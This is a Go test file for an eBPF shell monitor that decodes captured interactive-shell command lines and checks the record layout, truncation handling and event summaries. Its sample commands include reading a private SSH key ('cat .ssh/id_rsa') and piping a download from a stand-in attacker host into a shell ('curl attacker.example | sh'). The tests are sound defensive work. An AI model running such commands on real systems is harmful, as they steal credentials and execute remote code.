package ebpf

import (
	"encoding/binary"
	"strings"
	"testing"
)

// buildShellRec assembles the wire format of `struct shell_event` exactly as
// bpf/shell_monitor.c emits it.
func buildShellRec(cgroup, ts uint64, pid, tid, uid, flags uint32, comm, line string) []byte {
	const commOff = 32
	const lineOff = commOff + 16
	b := make([]byte, lineOff+shellLineLen)
	binary.LittleEndian.PutUint64(b[0:], cgroup)
	binary.LittleEndian.PutUint64(b[8:], ts)
	for i, v := range []uint32{pid, tid, uid, flags} {
		binary.LittleEndian.PutUint32(b[16+i*4:], v)
	}
	copy(b[commOff:lineOff], comm)
	copy(b[lineOff:], line)
	return b
}

func TestParseShellEvent(t *testing.T) {
	e := parseShellEvent(buildShellRec(7, 900, 111, 112, 1000, 0, "bash", "cd /root && cat .ssh/id_rsa"))
	if e == nil {
		t.Fatal("a well-formed record failed to decode")
	}
	if e.CgroupID != 7 || e.PID != 111 || e.UID != 1000 {
		t.Errorf("header decoded wrong: %+v", e)
	}
	if e.Comm != "bash" {
		t.Errorf("comm decoded as %q", e.Comm)
	}
	// The command is the entire point: `cd` is a builtin and produces no exec
	// event at all, so this string is the only record that it happened.
	if e.Line != "cd /root && cat .ssh/id_rsa" {
		t.Errorf("line decoded as %q", e.Line)
	}
}

func TestParseShellEventRejectsShortRecords(t *testing.T) {
	full := buildShellRec(1, 2, 3, 4, 5, 0, "bash", "ls")
	for _, n := range []int{0, 16, 32, 47, len(full) - 1} {
		if e := parseShellEvent(full[:n]); e != nil {
			t.Fatalf("a %d-byte record decoded to an event", n)
		}
	}
	if parseShellEvent(full) == nil {
		t.Fatal("a full-length record failed to decode")
	}
}

func TestParseShellEventHandlesAnUnterminatedLine(t *testing.T) {
	// A command exactly as long as the buffer arrives with no terminator. The
	// decoder must stop at the buffer rather than run into whatever follows.
	long := strings.Repeat("a", shellLineLen)
	e := parseShellEvent(buildShellRec(1, 2, 3, 4, 5, ShellTruncated, "bash", long))
	if e == nil {
		t.Fatal("a full-buffer line failed to decode")
	}
	if len(e.Line) != shellLineLen {
		t.Errorf("line length is %d, want %d", len(e.Line), shellLineLen)
	}
	if !e.Truncated() {
		t.Error("the truncation flag was lost")
	}
}

func TestShellEventSummary(t *testing.T) {
	e := &ShellEvent{Comm: "bash", PID: 111, UID: 0, Line: "curl attacker.example | sh"}
	s := e.Summary()
	for _, want := range []string{"bash", "111", "uid=0", "curl attacker.example | sh"} {
		if !strings.Contains(s, want) {
			t.Errorf("summary %q does not mention %q", s, want)
		}
	}

	empty := &ShellEvent{Comm: "bash", Flags: ShellEmpty}
	if !strings.Contains(empty.Summary(), "empty prompt") {
		t.Errorf("an empty prompt is not described: %q", empty.Summary())
	}
}

func TestIsInteractiveShell(t *testing.T) {
	for _, sh := range []string{"bash", "zsh", "ksh"} {
		if !IsInteractiveShell(sh) {
			t.Errorf("%s is not treated as probeable, so its prompt would never be captured", sh)
		}
	}
	// dash and busybox have no readline and no symbol to attach to. Listing
	// them would produce an attach error for every container that starts one,
	// describing a limitation that trying harder cannot fix.
	for _, sh := range []string{"dash", "sh", "busybox", "fish", "nginx", ""} {
		if IsInteractiveShell(sh) {
			t.Errorf("%s is treated as probeable, which would fail on every attach", sh)
		}
	}
}

func TestShellFlagValuesMatchTheKernelContract(t *testing.T) {
	if ShellTruncated != 0x01 {
		t.Errorf("ShellTruncated = %#x, but bpf/shell_monitor.c defines 0x01", ShellTruncated)
	}
	if ShellEmpty != 0x02 {
		t.Errorf("ShellEmpty = %#x, but bpf/shell_monitor.c defines 0x02", ShellEmpty)
	}
	// The buffer length is shared with the C struct by value, not by header,
	// so a change on one side must fail here rather than misalign every field
	// after it.
	if shellLineLen != 232 {
		t.Errorf("shellLineLen = %d, but bpf/shell_monitor.c defines LINE_LEN 232", shellLineLen)
	}
}

func TestTraceShellWithoutTheMonitorLoaded(t *testing.T) {
	// A manager with no shell collection is the degraded case, not a crash.
	m := &Manager{}
	if err := m.TraceShell("/bin/bash"); err == nil {
		t.Error("tracing succeeded with no monitor loaded")
	}
	if got := m.TracedShells(); len(got) != 0 {
		t.Errorf("shells are listed as traced: %v", got)
	}
	if err := m.UntraceShell("/bin/bash"); err != nil {
		t.Errorf("untracing something never traced returned %v, want nil", err)
	}
}

func TestTraceShellForPIDRejectsADeletedExecutable(t *testing.T) {
	m := &Manager{}
	// pid 0 has no /proc entry, so this exercises the readlink failure path.
	if err := m.TraceShellForPID(0); err == nil {
		t.Error("tracing pid 0 succeeded")
	}
}

func BenchmarkParseShellEvent(b *testing.B) {
	rec := buildShellRec(7, 900, 111, 112, 1000, 0, "bash", "cd /root && cat .ssh/id_rsa")
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		if parseShellEvent(rec) == nil {
			b.Fatal("decode failed")
		}
	}
}

func BenchmarkShellEventSummary(b *testing.B) {
	e := &ShellEvent{Comm: "bash", PID: 111, UID: 0, Line: "curl attacker.example | sh"}
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = e.Summary()
	}
}

func BenchmarkIsInteractiveShell(b *testing.B) {
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = IsInteractiveShell("bash")
	}
}
